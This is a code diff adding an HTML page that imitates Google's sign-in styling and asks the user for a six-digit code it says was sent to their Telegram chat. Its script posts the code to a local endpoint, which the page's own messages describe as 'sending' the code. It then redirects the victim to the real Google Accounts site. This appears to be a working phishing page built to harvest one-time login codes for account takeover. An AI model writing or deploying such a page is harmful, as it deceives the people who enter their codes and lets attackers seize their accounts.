@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enter Verification Code</title>
+  <style>
+    :root {
+      --bg-start: #87CEEB;
+      --bg-end: #E0F7FA;
+      --card-bg: #ffffff;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border-color: #dfe1e5;
+      --btn-bg: #1a73e8;
+      --btn-hover: #1765ef;
+    }
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: var(--bg-start);
+      background: linear-gradient(135deg, var(--bg-start), var(--bg-end));
+      min-height: 100vh;
+      color: var(--text-primary);
+    }
+    .container {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .card {
+      background: var(--card-bg);
+      width: 100%;
+      max-width: 360px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      padding: 2.5rem 2rem;
+      box-sizing: border-box;
+    }
+    h2 {
+      text-align: center;
+      margin: 0 0 1.5rem;
+      font-size: 1.8rem;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+    p {
+      text-align: center;
+      margin-bottom: 2rem;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+    }
+    .input-group {
+      margin-bottom: 1.6rem;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 0.4rem;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+    }
+    .input-group input {
+      width: 100%;
+      padding: 0.9rem 1rem;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 1rem;
+      box-sizing: border-box;
+      transition: border-color 0.2s;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: var(--btn-bg);
+      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+    }
+    .input-group input.error {
+      border-color: #cf2a2a;
+      box-shadow: 0 0 0 3px rgba(207, 42, 42, 0.15);
+    }
+    .error-msg {
+      margin-top: 0.4rem;
+      font-size: 0.78rem;
+      color: #cf2a2a;
+    }
+    .btn {
+      width: 100%;
+      padding: 0.95rem;
+      background: var(--btn-bg);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 1rem;
+      transition: background 0.2s;
+    }
+    .btn:focus {
+      outline: none;
+      background: var(--btn-hover);
+    }
+    .btn:hover {
+      background: var(--btn-hover);
+    }
+    .btn:active {
+      background: #1659d9;
+    }
+    .footer-links {
+      margin-top: 1.5rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+    }
+    .footer-links a {
+      color: var(--btn-bg);
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h2>Enter Verification Code</h2>
+      <p>We've sent a code to your Telegram chat. Please enter it below.</p>
+      <form id="codeForm">
+        <div class="input-group"><label for="code">Code</label><input type="text" id="code" name="code" placeholder="Enter the 6‑digit code" required autocomplete="one-time-code"><div class="error-msg" id="codeErr"></div></div>
+        <button type="submit" class="btn">Verify</button>
+      </form>
+      <div class="footer-links"><a href="#">Back to sign‑in</a></div>
+    </div>
+  </div>
+  <script>
+    const form = document.getElementById('codeForm');
+    const codeInput = form.elements.code;
+    const codeErr = document.getElementById('codeErr');
+    function clearErrors() {
+      codeErr.textContent = '';
+      codeInput.classList.remove('error');
+    }
+    function setError(input, msg) {
+      input.classList.add('error');
+      const errDiv = input.nextElementSibling;
+      if (errDiv && errDiv.classList.contains('error-msg')) {
+        errDiv.textContent = msg;
+      }
+    }
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      clearErrors();
+      const code = codeInput.value.trim();
+      if (!code) {
+        setError(codeInput, 'Code is required');
+        return;
+      }
+      try {
+        const response = await fetch('/api/verify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code })
+        });
+        const data = await response.json();
+        if (data.success) {
+          // Code sent successfully – redirect to Google Accounts
+          window.location.href = 'https://accounts.google.com';
+        } else {
+          alert('Failed to send code: ' + (data.error || 'unknown error'));
+        }
+      } catch (err) {
+        console.error('Fetch error:', err);
+        alert('An error occurred while submitting the code.');
+      }
+    });
+  </script>
+</body>
+</html>
